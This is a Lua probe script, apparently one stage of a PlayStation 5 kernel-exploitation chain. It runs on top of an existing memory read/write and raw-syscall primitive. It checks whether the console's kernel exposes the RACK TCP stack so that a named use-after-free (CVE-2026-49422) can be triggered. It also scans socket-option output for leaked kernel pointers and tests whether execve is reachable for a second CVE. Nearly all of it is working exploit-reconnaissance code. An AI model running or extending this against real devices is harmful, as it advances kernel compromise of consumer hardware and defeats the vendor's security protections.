-- CRASH_CLASS: MODERATE
-- PROBE 93d5: RACK TCP stack presence + CVE-2026-49422 reachability
--
-- CVE-2026-49422: RACK setsockopt handler drops lock during copyin,
-- stale pointer after stack switch race -> UAF
-- Needs: TCP_FUNCTION_BLK setsockopt to switch stacks
-- FreeBSD 13+ has RACK; PS5 kernel is FB11-based but Sony may have added it
--
-- Also tests: TCP_CONGESTION algorithm switching, TCP stack enumeration

print("=== PROBE 93d5: RACK TCP STACK PROBE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Create a TCP socket
local ok_s, rv_s = pcall(function()
    return mk(97)(uint64(2), uint64(1), uint64(6)) -- AF_INET, SOCK_STREAM, IPPROTO_TCP
end)
local tcp_fd = ok_s and N(rv_s) or -1
print("tcp_fd=" .. tcp_fd)
if tcp_fd < 0 then print("No TCP socket!"); return end

-- ======== SECTION A: TCP option enumeration ========
print("")
print("--- A: TCP setsockopt/getsockopt enumeration ---")

-- IPPROTO_TCP = 6
-- Key TCP options we want to test:
-- TCP_FUNCTION_BLK = 0x2000 (8192) on FreeBSD 13+
-- TCP_RACK_* options start at various numbers
-- Let's try a range of option numbers

local IPPROTO_TCP = 6
local SOL_SOCKET = 0xFFFF
local buf = memory.alloc(0x200)
local lenp = memory.alloc(8)

-- First: getsockopt for TCP_FUNCTION_BLK (0x2000)
-- struct tcp_function_set { char function_set_name[TCP_FUNCTION_NAME_LEN_MAX]; uint32_t pcbcnt; }
-- TCP_FUNCTION_NAME_LEN_MAX = 32
wd(N(lenp), 0x30) -- 48 bytes
for i = 0, 0x30, 4 do wd(N(buf) + i, 0) end
local ok_g, rv_g = pcall(function()
    return mk(118)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(0x2000),
        uint64(N(buf)), uint64(N(lenp)))
end)
local gso_ret = ok_g and N(rv_g) or -999
if gso_ret >= 0x80000000 then gso_ret = gso_ret - 0x100000000 end
print(string.format("getsockopt(TCP_FUNCTION_BLK=0x2000): ret=%d", gso_ret))

if gso_ret == 0 then
    local len = rd(N(lenp)) or 0
    print("  len=" .. len)
    -- Read the function name (first 32 bytes as string)
    local name = ""
    for i = 0, 31 do
        local b = rd(N(buf) + i)
        if b then
            b = b % 256
            if b == 0 then break end
            name = name .. string.char(b)
        end
    end
    print("  current stack: '" .. name .. "'")
    local pcbcnt = rd(N(buf) + 32) or 0
    print("  pcbcnt=" .. pcbcnt)
    print("  *** TCP_FUNCTION_BLK EXISTS ***")
end

-- Try setting TCP_FUNCTION_BLK to "rack"
print("")
print("--- B: Try switching to RACK ---")
local rack_buf = memory.alloc(0x30)
for i = 0, 0x2C, 4 do wd(N(rack_buf) + i, 0) end
-- Write "rack\0" into the name field
wd(N(rack_buf), 0x6B636172) -- "rack" in little-endian
wd(N(rack_buf) + 4, 0)

local ok_set, rv_set = pcall(function()
    return mk(105)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(0x2000),
        uint64(N(rack_buf)), uint64(0x24))
end)
local sso_ret = ok_set and N(rv_set) or -999
if sso_ret >= 0x80000000 then sso_ret = sso_ret - 0x100000000 end
print(string.format("setsockopt(TCP_FUNCTION_BLK, 'rack'): ret=%d", sso_ret))

if sso_ret == 0 then
    print("  *** RACK STACK IS AVAILABLE! CVE-2026-49422 MAY BE REACHABLE ***")
end

-- Try "freebsd" (the default stack name)
wd(N(rack_buf), 0x65657266) -- "free"
wd(N(rack_buf) + 4, 0x00647362) -- "bsd\0"
ok_set, rv_set = pcall(function()
    return mk(105)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(0x2000),
        uint64(N(rack_buf)), uint64(0x24))
end)
sso_ret = ok_set and N(rv_set) or -999
if sso_ret >= 0x80000000 then sso_ret = sso_ret - 0x100000000 end
print(string.format("setsockopt(TCP_FUNCTION_BLK, 'freebsd'): ret=%d", sso_ret))

-- Try "bbr" (another alternative stack)
wd(N(rack_buf), 0x00726262) -- "bbr\0"
wd(N(rack_buf) + 4, 0)
ok_set, rv_set = pcall(function()
    return mk(105)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(0x2000),
        uint64(N(rack_buf)), uint64(0x24))
end)
sso_ret = ok_set and N(rv_set) or -999
if sso_ret >= 0x80000000 then sso_ret = sso_ret - 0x100000000 end
print(string.format("setsockopt(TCP_FUNCTION_BLK, 'bbr'): ret=%d", sso_ret))

-- ======== SECTION C: RACK-specific TCP options ========
print("")
print("--- C: RACK TCP option scan ---")

-- RACK options on FreeBSD 13+ (these may not exist on PS5):
-- TCP_RACK_PACE_MAX_SEG = 0x41 (1025 + offset)
-- Actually the exact numbers vary. Let's scan setsockopt for TCP options
-- in the higher range (0x20-0x50, 0x400-0x450, 0x2000-0x2010)

local interesting_opts = {
    {0x01, "TCP_NODELAY"},
    {0x02, "TCP_MAXSEG"},
    {0x04, "TCP_NOOPT"},
    {0x08, "TCP_NOPUSH"},
    {0x10, "TCP_KEEPIDLE"},
    {0x20, "TCP_FASTOPEN"},
    {0x21, "TCP_TXTLS_ENABLE"},
    {0x22, "TCP_TXTLS_MODE"},
    {0x40, "TCP_PCAP_OUT"},
    {0x41, "TCP_PCAP_IN"},
    {0x80, "TCP_LOG"},
    {0x400, "TCP_LOGID"},
    {0x401, "TCP_LOGDUMP"},
    {0x402, "TCP_LOGDUMPID"},
    {0x2000, "TCP_FUNCTION_BLK"},
    {0x2001, "TCP_FUNCTION_ALIAS"},
}

for _, opt in ipairs(interesting_opts) do
    wd(N(lenp), 0x100)
    for i = 0, 0x100, 4 do wd(N(buf) + i, 0xDEAD0000 + i) end
    local ok_o, rv_o = pcall(function()
        return mk(118)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(opt[1]),
            uint64(N(buf)), uint64(N(lenp)))
    end)
    local oret = ok_o and N(rv_o) or -999
    if oret >= 0x80000000 then oret = oret - 0x100000000 end
    local olen = rd(N(lenp)) or 0
    local tag = ""
    if oret == 0 and olen > 0 then
        local first = rd(N(buf)) or 0
        tag = string.format(" len=%d val=0x%X", olen, first)
        -- Check for kernel pointers in output
        for off = 0, math.min(olen - 4, 0xFC), 4 do
            local lo = rd(N(buf) + off) or 0
            local hi = rd(N(buf) + off + 4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                tag = tag .. string.format(" [KPTR +0x%X: 0x%08X%08X]", off, hi, lo)
            end
        end
    end
    if oret == 0 then
        print(string.format("  0x%04X %-22s ret=0%s", opt[1], opt[2], tag))
    end
end

-- ======== SECTION D: Scan unknown TCP option range ========
print("")
print("--- D: Unknown TCP option scan (0x2000-0x2020) ---")
for optnum = 0x2000, 0x2020 do
    wd(N(lenp), 0x100)
    for i = 0, 0x40, 4 do wd(N(buf) + i, 0) end
    local ok_o, rv_o = pcall(function()
        return mk(118)(uint64(tcp_fd), uint64(IPPROTO_TCP), uint64(optnum),
            uint64(N(buf)), uint64(N(lenp)))
    end)
    local oret = ok_o and N(rv_o) or -999
    if oret >= 0x80000000 then oret = oret - 0x100000000 end
    if oret == 0 then
        local olen = rd(N(lenp)) or 0
        local first = rd(N(buf)) or 0
        print(string.format("  0x%04X: ret=0 len=%d val=0x%X", optnum, olen, first))
    end
end

-- ======== SECTION E: SysV IPC summary (for completeness) ========
print("")
print("--- E: SysV IPC quick recheck ---")
-- Already tested in 525a section A, confirming here
local ok_sem, rv_sem = pcall(function()
    return mk(221)(uint64(0), uint64(1), uint64(0x3B6))
end)
print("semget(221): " .. (ok_sem and N(rv_sem) or -999))

-- Also test execve reachability (for CVE-2026-7270)
print("")
print("--- F: execve(59) reachability ---")
-- Just test if the syscall exists (don't actually exec anything useful)
-- Pass bogus args to see if we get -1 (exists) or kill (nosys)
local ok_ex, rv_ex = pcall(function()
    return mk(59)(uint64(0), uint64(0), uint64(0))
end)
local ex_ret = ok_ex and N(rv_ex) or -999
if ex_ret >= 0x80000000 then ex_ret = ex_ret - 0x100000000 end
print(string.format("execve(NULL, NULL, NULL): ret=%d ok=%s", ex_ret, tostring(ok_ex)))

-- Close TCP socket
pcall(function() mk(6)(uint64(tcp_fd)) end)

print("")
print("alive=" .. tostring(alive()))
print("=== 93d5 COMPLETE ===")
